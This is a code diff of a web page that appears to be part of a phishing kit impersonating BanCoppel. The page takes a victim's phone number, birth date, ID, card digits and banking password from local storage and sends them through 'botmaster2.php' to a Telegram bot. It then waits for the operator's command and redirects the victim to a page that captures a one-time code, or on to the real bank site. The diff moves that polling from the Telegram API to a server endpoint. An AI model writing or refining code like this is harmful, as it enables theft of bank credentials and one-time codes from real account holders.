@@ -69,7 +69,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     return;
   }
 
-  const { token, chat_id } = config;
+  const { token } = config;
   const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
 
   if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
@@ -99,108 +99,42 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
+  // Solo enviar mensaje, sin getUpdates
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
+    body: "data=" + encodeURIComponent(mensaje) +
+          "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  const latestOffset = await getLastUpdateId(token);
-  checkBoton(token, transactionId, latestOffset + 1);
-});
+  // Inicia la escucha del botón desde Webhook
+  revisarAccion(transactionId);
 
-async function getLastUpdateId(botToken) {
-  try {
-    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
-    const data = await res.json();
-    if (!data.ok || !data.result.length) return 0;
-    return data.result[data.result.length - 1].update_id;
-  } catch (e) {
-    return 0;
-  }
-}
+  async function revisarAccion(txId) {
+    try {
+      const res = await fetch(`sendStatus.php?txid=${txId}`);
+      const json = await res.json();
 
-async function checkBoton(botToken, txId, offset) {
-  try {
-    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`);
-    const data = await res.json();
-
-    if (!data.ok || !data.result) throw new Error("Sin respuesta válida");
-    let newOffset = offset;
-
-    for (const update of data.result) {
-      newOffset = update.update_id + 1;
-
-      if (update.callback_query && update.callback_query.data.includes(txId)) {
-        const tipo = update.callback_query.data.split(":")[0];
-        const chatId = update.callback_query.message.chat.id;
-        const callbackId = update.callback_query.id;
-
-        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            callback_query_id: callbackId,
-            text: "Acción recibida ✅",
-            show_alert: false
-          })
-        });
-
-        await fetch("sendStatus.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ status: tipo })
-        });
-
-        switch (tipo) {
-          case "pedir_dinamica":
-            return window.location.href = "cel-dina.html";
-          case "error_logo":
-            return window.location.href = "errorlogo.html";
-          case "confirm_finalizar":
-            return window.location.href = "https://www.bancoppel.com";
-        }
+      if (!json.status || json.status === "esperando") {
+        return setTimeout(() => revisarAccion(txId), 3000);
       }
-    }
 
-    setTimeout(() => checkBoton(botToken, txId, newOffset), 2500);
-  } catch (err) {
-    console.error("Error verificando botón:", err);
-    setTimeout(() => checkBoton(botToken, txId, offset), 3000);
+      switch (json.status) {
+        case "pedir_dinamica":
+          window.location.href = "cel-dina.html"; break;
+        case "error_logo":
+          window.location.href = "errorlogo.html"; break;
+        case "finalizar":
+        case "confirm_finalizar":
+          window.location.href = "https://www.bancoppel.com"; break;
+      }
+
+    } catch (e) {
+      console.error("Error al revisar botón:", e);
+      setTimeout(() => revisarAccion(txId), 3000);
+    }
   }
-}
-  // JS: revisa constantemente si el usuario presionó un botón en Telegram
-async function revisarAccion() {
-  const txId = localStorage.getItem("transactionId");
-  if (!txId) return;
-
-  try {
-    const res = await fetch(`sendStatus.php?txid=${txId}`);
-    const json = await res.json();
-    if (!json.status || json.status === "esperando") {
-      return setTimeout(revisarAccion, 3000);
-    }
-
-    switch (json.status) {
-      case "pedir_dinamica":
-        window.location.href = "cel-dina.html"; break;
-      case "error_logo":
-        window.location.href = "errorlogo.html"; break;
-      case "error_otp":
-        window.location.href = "cel-dina-error.html"; break;
-      case "finalizar":
-      case "confirm_finalizar":
-        window.location.href = "https://www.bancoppel.com"; break;
-    }
-
-  } catch (e) {
-    console.error("Error al revisar botón:", e);
-    setTimeout(revisarAccion, 3000);
-  }
-}
-
-revisarAccion();
-
+});
 </script>
 </body>
 </html>
